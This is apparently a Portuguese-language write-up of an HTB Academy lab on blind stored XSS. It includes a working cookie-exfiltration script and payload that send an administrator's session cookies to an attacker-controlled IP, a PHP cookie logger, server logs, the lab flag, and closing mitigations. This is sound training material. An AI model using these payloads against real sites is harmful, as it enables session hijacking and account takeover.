# HTB Academy - Cross-Site Scripting (XSS) Skills Assessment

<img src="https://i.imgur.com/58ZFRDF.png"/>

## Resumo

Durante um teste de segurança em uma aplicação web de blog, foi identificada uma vulnerabilidade de **Blind Stored Cross-Site Scripting (XSS)** que permitiu a execução de código JavaScript no navegador do administrador da aplicação.

Através da vulnerabilidade foi possível carregar um script remoto controlado pelo atacante, exfiltrar os cookies da sessão do administrador e obter a flag do desafio.

---

# Informações do Laboratório

**Módulo:** Cross-Site Scripting (XSS)

**Objetivo:**

* Identificar uma vulnerabilidade XSS
* Encontrar um payload funcional
* Explorar a vulnerabilidade utilizando Session Hijacking
* Obter a flag armazenada nos cookies da vítima

---

# Metodologia

A exploração foi realizada seguindo as etapas:

1. Reconhecimento da aplicação
2. Identificação do campo vulnerável
3. Teste de payloads XSS
4. Hospedagem de script remoto
5. Captura dos cookies da vítima
6. Extração da flag

---

# Reconhecimento

A aplicação disponibilizava um blog com funcionalidades de interação do usuário.

Como o objetivo final era obter informações pertencentes ao administrador, a hipótese inicial foi de uma vulnerabilidade do tipo:

* Stored XSS
* Blind XSS

Neste cenário, o conteúdo enviado pelo usuário é posteriormente visualizado por um administrador em outra interface da aplicação.

---

# Preparação do Ambiente

Foi criado um diretório temporário para hospedar os arquivos utilizados durante a exploração.

```bash
mkdir /tmp/xss
cd /tmp/xss
```

---

# Criação do Script de Exfiltração

Arquivo:

```bash
nano script.js
```

Conteúdo:

```javascript
new Image().src='http://10.10.14.61:81/index.php?c='+document.cookie;
```

## Funcionamento

Quando executado no navegador da vítima:

1. Lê todos os cookies acessíveis via `document.cookie`
2. Cria uma requisição HTTP para o servidor controlado pelo atacante
3. Envia os cookies como parâmetro GET

---

# Criação do Capturador

Arquivo:

```bash
nano index.php
```

Conteúdo:

```php
<?php
if(isset($_GET['c'])){
    file_put_contents(
        "cookies.txt",
        $_GET['c'].PHP_EOL,
        FILE_APPEND
    );
}
?>
```

## Funcionamento

O script recebe o parâmetro `c` contendo os cookies da vítima e registra seu conteúdo em um arquivo local.

---

# Inicialização do Servidor

Foi iniciado um servidor PHP para hospedar os arquivos.

```bash
sudo php -S 0.0.0.0:81
```

Resultado:

```text
PHP 8.4.16 Development Server (http://0.0.0.0:81) started
```

---

# Payload XSS

Após identificar o campo vulnerável, foi utilizado o seguinte payload:

```html
<script src="http://10.10.14.61:81/script.js"></script>
```

## Funcionamento

O navegador do administrador:

1. Processa a tag `<script>`
2. Solicita o arquivo remoto `script.js`
3. Executa o JavaScript hospedado pelo atacante
4. Envia os cookies da sessão para o servidor do atacante

---

# Execução da Exploração

Após o envio do payload, o administrador acessou o conteúdo vulnerável.

O servidor registrou as seguintes requisições:

```text
[Fri Jun 12 18:21:53 2026] 10.129.234.166:56658 [200]: GET /script.js

[Fri Jun 12 18:21:54 2026] 10.129.234.166:56660 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1781302918;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

---

# Análise dos Resultados

Os cookies recebidos foram:

```text
wordpress_test_cookie=WP Cookie check
wp-settings-time-2=1781302918
flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

Foi possível observar que a flag estava armazenada diretamente em um cookie acessível por JavaScript.

---

# Flag

```text
HTB{cr055_5173_5cr1p71n6_n1nj4}
```

---

# Impacto da Vulnerabilidade

Uma vulnerabilidade Blind Stored XSS pode permitir:

* Roubo de cookies
* Session Hijacking
* Roubo de credenciais
* Execução de ações em nome da vítima
* Defacement da aplicação
* Movimentação lateral dentro da aplicação
* Comprometimento de contas administrativas

Em ambientes reais, uma vulnerabilidade semelhante pode resultar no comprometimento completo de painéis administrativos.

---

# Mitigações

## Sanitização de Entrada

Filtrar caracteres perigosos:

```html
<
>
"
'
```

Utilizar bibliotecas como:

* DOMPurify

---

## Output Encoding

Codificar caracteres especiais antes de renderizar conteúdo fornecido por usuários.

Exemplo:

```php
htmlspecialchars($input);
```

---

## Content Security Policy (CSP)

Implementar políticas restritivas:

```http
Content-Security-Policy: script-src 'self';
```

Isso impede o carregamento de scripts hospedados em domínios externos.

---

## Cookies HttpOnly

Configurar cookies sensíveis com:

```http
HttpOnly
```

Dessa forma:

```javascript
document.cookie
```

não consegue acessar o cookie.

---

## Secure Cookies

Utilizar:

```http
Secure
```

para garantir transmissão apenas via HTTPS.

---

# Lições Aprendidas

Durante este laboratório foram praticados conceitos fundamentais relacionados a XSS:

* Stored XSS
* Blind XSS
* XSS Discovery
* Remote Script Loading
* JavaScript Injection
* Cookie Theft
* Session Hijacking
* Exfiltração de Dados
* Impacto da ausência do atributo HttpOnly
* Importância de Content Security Policy (CSP)

O exercício demonstrou como uma simples vulnerabilidade XSS pode evoluir para o comprometimento de sessões privilegiadas e acesso a informações sensíveis.

---

# Conclusão

A aplicação apresentava uma vulnerabilidade Blind Stored XSS que permitia a execução de JavaScript arbitrário no navegador do administrador.

Explorando a vulnerabilidade foi possível carregar um script remoto controlado pelo atacante, capturar os cookies da vítima e obter a flag armazenada na sessão.

O laboratório demonstrou na prática como ataques de Session Hijacking podem ser realizados através de vulnerabilidades XSS quando mecanismos de proteção adequados não são implementados.
